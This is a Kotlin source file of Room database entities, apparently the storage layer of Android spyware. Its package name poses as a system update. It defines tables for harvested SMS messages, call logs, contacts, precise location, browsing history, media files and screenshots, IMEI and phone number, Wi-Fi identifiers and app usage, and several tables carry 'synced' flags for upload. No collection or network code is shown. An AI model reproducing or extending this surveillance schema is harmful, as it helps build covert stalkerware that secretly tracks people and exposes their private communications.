package com.androidsystem.update.database

import androidx.room.Entity
import androidx.room.PrimaryKey

@Entity(tableName = "collected_data")
data class CollectedDataEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val type: String,
    val content: String,
    val timestamp: Long,
    val synced: Int = 0
)

@Entity(tableName = "location_data")
data class LocationEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val altitude: Double,
    val speed: Float,
    val bearing: Float,
    val provider: String,
    val timestamp: Long
)

@Entity(tableName = "sms_data")
data class SmsEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val address: String,
    val body: String,
    val date: Long,
    val type: Int,
    val read: Int
)

@Entity(tableName = "call_data")
data class CallEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val number: String,
    val date: Long,
    val duration: Long,
    val type: Int,
    val name: String
)

@Entity(tableName = "contact_data")
data class ContactEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val name: String,
    val phone: String,
    val phoneHash: String = ""
)

@Entity(tableName = "browsing_history")
data class BrowsingHistoryEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val url: String,
    val title: String?,
    val packageName: String,
    val visitTime: Long,
    val synced: Int = 0
)

@Entity(tableName = "media_files")
data class MediaFileEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val path: String,
    val name: String,
    val mimeType: String?,
    val dateAdded: Long,
    val isScreenshot: Boolean
)

@Entity(tableName = "device_info")
data class DeviceInfoEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val manufacturer: String,
    val model: String,
    val device: String,
    val product: String,
    val androidVersion: String,
    val sdkVersion: Int,
    val imei: String,
    val phoneNumber: String,
    val simOperator: String,
    val networkOperator: String,
    val androidId: String,
    val wifiSsid: String,
    val wifiBssid: String,
    val wifiRssi: Int,
    val batteryLevel: Int,
    val timestamp: Long = System.currentTimeMillis()
)

@Entity(tableName = "app_usage")
data class AppUsageEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val packageName: String,
    val totalTime: Long,
    val launchCount: Int,
    val timestamp: Long = System.currentTimeMillis()
)
